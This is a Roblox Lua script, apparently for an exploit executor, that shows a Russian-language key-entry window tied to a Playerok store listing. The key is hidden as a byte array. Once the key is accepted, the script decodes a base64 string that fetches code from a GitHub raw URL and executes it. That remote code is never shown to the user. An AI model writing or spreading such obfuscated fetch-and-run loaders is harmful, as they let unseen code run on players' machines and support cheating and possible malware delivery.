local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- Зашифрованный скрипт
local encodedScript = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pd2FudHNvbTMvc2NyaXB0L3JlZnMvaGVhZHMvbWFpbi9HYWciKSkoKQ=="

-- Декодер base64
local function b64decode(data)
	local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	data = string.gsub(data, "[^" .. b .. "=]", "")
	return (data:gsub(".", function(x)
		if x == "=" then return "" end
		local r, f = "", (b:find(x) - 1)
		for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0") end
		return r
	end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
		if #x ~= 8 then return "" end
		local c = 0
		for i = 1, 8 do c = c + (x:sub(i, i) == "1" and 2 ^ (8 - i) or 0) end
		return string.char(c)
	end))
end

-- Проверка ключа
local keyData = {80,108,97,121,101,114,111,107,32,77,73,76,69,68,73,32,83,84,79,82,69}
local function decodeKey(tbl)
	local s = ""
	for _, v in ipairs(tbl) do s = s .. string.char(v) end
	return s
end
local validKey = decodeKey(keyData)

-- GUI
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "PlayerokKeyGui"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 400, 0, 240)
frame.Position = UDim2.new(0.5, 0, 0.4, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
frame.BackgroundTransparency = 1
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
Instance.new("UIGradient", frame).Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 140, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 220, 255))
}

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 20)
title.BackgroundTransparency = 1
title.Text = "🔐 Введите ключ от Playerok"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 22

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.8, 0, 0, 36)
box.Position = UDim2.new(0.1, 0, 0, 80)
box.PlaceholderText = "Вставьте ключ..."
box.Font = Enum.Font.Gotham
box.TextSize = 20
box.TextColor3 = Color3.fromRGB(50, 50, 50)
box.BackgroundColor3 = Color3.fromRGB(230, 230, 255)
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.8, 0, 0, 40)
button.Position = UDim2.new(0.1, 0, 0, 130)
button.BackgroundColor3 = Color3.fromRGB(160, 200, 255)
button.Font = Enum.Font.GothamBold
button.TextSize = 20
button.TextColor3 = Color3.fromRGB(30, 30, 30)
button.Text = "Проверить"
Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)

local getKeyButton = Instance.new("TextButton", frame)
getKeyButton.Size = UDim2.new(0.8, 0, 0, 40)
getKeyButton.Position = UDim2.new(0.1, 0, 0, 180)
getKeyButton.BackgroundColor3 = Color3.fromRGB(160, 200, 255)
getKeyButton.Font = Enum.Font.GothamBold
getKeyButton.TextSize = 20
getKeyButton.TextColor3 = Color3.fromRGB(30, 30, 30)
getKeyButton.Text = "Получить ключ"
Instance.new("UICorner", getKeyButton).CornerRadius = UDim.new(0, 12)

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, 0, 0, 20)
feedback.Position = UDim2.new(0, 0, 0, 175)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.new(1, 1, 1)
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 18

local copyFeedback = Instance.new("TextLabel", frame)
copyFeedback.Size = UDim2.new(1, 0, 0, 20)
copyFeedback.Position = UDim2.new(0, 0, 0, 225)
copyFeedback.BackgroundTransparency = 1
copyFeedback.Text = ""
copyFeedback.TextColor3 = Color3.fromRGB(30, 200, 30)
copyFeedback.Font = Enum.Font.Gotham
copyFeedback.TextSize = 16

-- Кнопка проверить
button.MouseButton1Click:Connect(function()
	local input = box.Text:match("^%s*(.-)%s*$")
	if input == validKey then
		feedback.Text = "✅ Ключ верный, загружаем..."
		feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
		wait(1)
		gui:Destroy()
		loadstring(b64decode(encodedScript))()
	else
		feedback.Text = "❌ Неверный ключ"
		feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
	end
end)

-- Кнопка получить ключ
getKeyButton.MouseButton1Click:Connect(function()
	setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
	copyFeedback.Text = "Ссылка скопирована"
	task.delay(2, function()
		copyFeedback.Text = ""
	end)
end)

-- Выход по Escape
UserInputService.InputBegan:Connect(function(input, gpe)
	if not gpe and input.KeyCode == Enum.KeyCode.Escape then
		gui:Destroy()
	end
end)
